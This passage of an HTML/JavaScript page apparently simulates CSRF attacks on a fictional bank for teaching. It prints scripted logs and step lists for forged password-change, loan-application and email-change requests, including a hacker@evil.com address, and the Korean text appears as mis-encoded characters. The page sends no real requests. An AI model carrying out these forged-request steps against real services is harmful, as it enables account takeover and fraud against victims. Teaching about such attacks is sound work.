                addLog('[POST] https://xxbank.com/api/change-password', 'text-blue-400');
                await sleep(300);
                addLog('[PAYLOAD] newPassword=hacker123!@#', 'text-gray-400');
                await sleep(300);
                addLog('[VALIDATION] Session check: PASS âœ“', 'text-green-400');
                await sleep(300);
                addLog('[VALIDATION] CSRF token check: SKIPPED âœ—', 'text-red-400');
                await sleep(500);
                addLog('[DANGER] Password changed without verification!', 'text-red-500 font-bold');
                await sleep(300);
                addLog('[RESULT] New password: hacker123!@#', 'text-red-500 font-bold');
                
                document.getElementById('attackSuccess').classList.remove('hidden');
                document.getElementById('attackDetails').innerHTML = 
                    '<strong>âœ“ ë¹„ë°€ë²ˆí˜¸ ë³€ê²½ ì„±ê³µ!</strong><br>' +
                    'í”¼í•´ìì˜ ë¹„ë°€ë²ˆí˜¸ê°€ <code class="bg-black px-2 py-1">hacker123!@#</code>ë¡œ ë³€ê²½ë˜ì—ˆìŠµë‹ˆë‹¤.<br>' +
                    '<span class="text-xs mt-2 block">í•´ì»¤ëŠ” ì´ì œ ì´ ë¹„ë°€ë²ˆí˜¸ë¡œ ë¡œê·¸ì¸í•˜ì—¬ ê³„ì •ì„ ì™„ì „íˆ ì¥ì•…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</span>';
                
                document.getElementById('attackStages').classList.remove('hidden');
                document.getElementById('stagesContent').innerHTML = 
                    '<div><strong>1ë‹¨ê³„:</strong> í”¼ì‹± ì‚¬ì´íŠ¸ì—ì„œ ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰</div>' +
                    '<div><strong>2ë‹¨ê³„:</strong> ë¹„ë°€ë²ˆí˜¸ ë³€ê²½ API í˜¸ì¶œ</div>' +
                    '<div><strong>3ë‹¨ê³„:</strong> ì„¸ì…˜ ì¿ í‚¤ë¡œ ë³¸ì¸ ì¸ì¦ í†µê³¼</div>' +
                    '<div><strong>4ë‹¨ê³„:</strong> CSRF í† í° ì—†ì´ ë¹„ë°€ë²ˆí˜¸ ë³€ê²½</div>' +
                    '<div><strong>5ë‹¨ê³„:</strong> í•´ì»¤ê°€ ìƒˆ ë¹„ë°€ë²ˆí˜¸ë¡œ ë¡œê·¸ì¸</div>' +
                    '<div><strong>6ë‹¨ê³„:</strong> ê³„ì • ì™„ì „ ì¥ì•…</div>';
                
            } else if (scenario === 3) {
                // ëŒ€ì¶œ ì‹ ì²­
                addLog('[POST] https://xxbank.com/api/loan/apply', 'text-blue-400');
                await sleep(300);
                addLog('[PAYLOAD] amount=50000000, period=60months', 'text-gray-400');
                await sleep(300);
                addLog('[PAYLOAD] depositAccount=999-888-777777', 'text-gray-400');
                await sleep(300);
                addLog('[VALIDATION] Session check: PASS âœ“', 'text-green-400');
                await sleep(300);
                addLog('[VALIDATION] CSRF token check: SKIPPED âœ—', 'text-red-400');
                await sleep(500);
                addLog('[DANGER] Loan application submitted!', 'text-red-500 font-bold');
                await sleep(300);
                addLog('[RESULT] â‚©50,000,000 loan approved', 'text-red-500 font-bold');
                
                document.getElementById('attackSuccess').classList.remove('hidden');
                document.getElementById('attackDetails').innerHTML = 
                    '<strong>âœ“ ëŒ€ì¶œ ì‹ ì²­ ì„±ê³µ!</strong><br>' +
                    'í”¼í•´ì ëª…ì˜ë¡œ <strong class="text-xl">â‚©50,000,000</strong> (5ì²œë§Œì›) ëŒ€ì¶œì´ ì‹ ì²­ë˜ì—ˆìŠµë‹ˆë‹¤.<br>' +
                    'ëŒ€ì¶œê¸ˆì€ í•´ì»¤ ê³„ì¢Œ(999-888-777777)ë¡œ ì…ê¸ˆë©ë‹ˆë‹¤.<br>' +
                    '<span class="text-xs mt-2 block">í”¼í•´ìëŠ” ë‚˜ì¤‘ì— ëŒ€ì¶œ ìƒí™˜ ë…ì´‰ì„ ë°›ê³ ì„œì•¼ ì•Œê²Œ ë©ë‹ˆë‹¤.</span>';
                
                document.getElementById('attackStages').classList.remove('hidden');
                document.getElementById('stagesContent').innerHTML = 
                    '<div><strong>1ë‹¨ê³„:</strong> í”¼ì‹± ì‚¬ì´íŠ¸ì—ì„œ ëŒ€ì¶œ ì‹ ì²­ í¼ ìë™ ì œì¶œ</div>' +
                    '<div><strong>2ë‹¨ê³„:</strong> iframeì„ ì‚¬ìš©í•´ ê²°ê³¼ ìˆ¨ê¹€</div>' +
                    '<div><strong>3ë‹¨ê³„:</strong> í”¼í•´ì ì„¸ì…˜ìœ¼ë¡œ ë³¸ì¸ ì¸ì¦</div>' +
                    '<div><strong>4ë‹¨ê³„:</strong> ëŒ€ì¶œ ìŠ¹ì¸ (CSRF í† í° ì—†ìŒ)</div>' +
                    '<div><strong>5ë‹¨ê³„:</strong> ëŒ€ì¶œê¸ˆì´ í•´ì»¤ ê³„ì¢Œë¡œ ì…ê¸ˆ</div>';
                
            } else if (scenario === 4) {
                // ì´ë©”ì¼ ë³€ê²½
                addLog('[POST] https://xxbank.com/api/profile/email', 'text-blue-400');
                await sleep(300);
                addLog('[PAYLOAD] email=hacker@evil.com', 'text-gray-400');
                await sleep(300);
                addLog('[VALIDATION] Session check: PASS âœ“', 'text-green-400');
                await sleep(300);
                addLog('[VALIDATION] CSRF token check: SKIPPED âœ—', 'text-red-400');
                await sleep(500);
                addLog('[DANGER] Email changed to hacker@evil.com', 'text-red-500 font-bold');
                await sleep(300);
                addLog('[INFO] Attacker can now reset password via email', 'text-red-500 font-bold');
                
                document.getElementById('attackSuccess').classList.remove('hidden');
                document.getElementById('attackDetails').innerHTML = 
                    '<strong>âœ“ ì´ë©”ì¼ ë³€ê²½ ì„±ê³µ!</strong><br>' +
                    'í”¼í•´ìì˜ ì´ë©”ì¼ì´ <code class="bg-black px-2 py-1">hacker@evil.com</code>ë¡œ ë³€ê²½ë˜ì—ˆìŠµë‹ˆë‹¤.<br>' +
                    '<span class="text-xs mt-2 block">í•´ì»¤ëŠ” ì´ì œ "ë¹„ë°€ë²ˆí˜¸ ì°¾ê¸°"ë¥¼ í†µí•´ ì¬ì„¤ì • ë§í¬ë¥¼ ë°›ì•„ ê³„ì •ì„ íƒˆì·¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</span>';
                
                document.getElementById('attackStages').classList.remove('hidden');
                document.getElementById('stagesContent').innerHTML = 
                    '<div><strong>1ë‹¨ê³„:</strong> ì´ë©”ì¼ ë³€ê²½ ìš”ì²­ ì „ì†¡</div>' +
                    '<div><strong>2ë‹¨ê³„:</strong> CSRF í† í° ì—†ì´ ì´ë©”ì¼ ë³€ê²½</div>' +
                    '<div><strong>3ë‹¨ê³„:</strong> í•´ì»¤ê°€ "ë¹„ë°€ë²ˆí˜¸ ì°¾ê¸°" ìš”ì²­</div>' +
                    '<div><strong>4ë‹¨ê³„:</strong> ì¬ì„¤ì • ë§í¬ê°€ í•´ì»¤ ì´ë©”ì¼ë¡œ ì „ì†¡</div>' +
                    '<div><strong>5ë‹¨ê³„:</strong> í•´ì»¤ê°€ ë¹„ë°€ë²ˆí˜¸ ì¬ì„¤ì •</div>' +
                    '<div><strong>6ë‹¨ê³„:</strong> 2ì°¨ ì¸ì¦ë„ í•´ì»¤ ì´ë©”ì¼ë¡œ ì „ì†¡ë¨</div>';
            }
            
            badge.textContent = 'COMPROMISED';
            badge.className = 'text-xs bg-red-500 text-white px-3 py-1 rounded code-font';
            
            document.getElementById('judgementBox').classList.remove('hidden');
            document.getElementById('judgement').innerHTML = '<span class="text-red-400">ì·¨ì•½</span>';
            document.getElementById('evidence').textContent = 'CSRF í† í° ê²€ì¦ ì—†ì´ ìƒíƒœ ë³€ê²½ ìš”ì²­ ì‹¤í–‰ - ì‚¬ìš©ì ì˜ë„ì™€ ë¬´ê´€í•˜ê²Œ ì•…ì˜ì  ì‘ì—… ìˆ˜í–‰ë¨';
            document.getElementById('damageBox').classList.remove('hidden');
        }

        function addLog(msg, colorClass) {
            var div = document.createElement('div');
            div.className = colorClass || 'text-gray-400';
            div.textContent = '> ' + msg;
            var container = document.getElementById('serverLog');
            container.appendChild(div);
            container.scrollTop = container.scrollHeight;
        }

        function sleep(ms) {
            return new Promise(function(resolve) {
                setTimeout(resolve, ms);
            });
        }
    </script>
</body>
</html>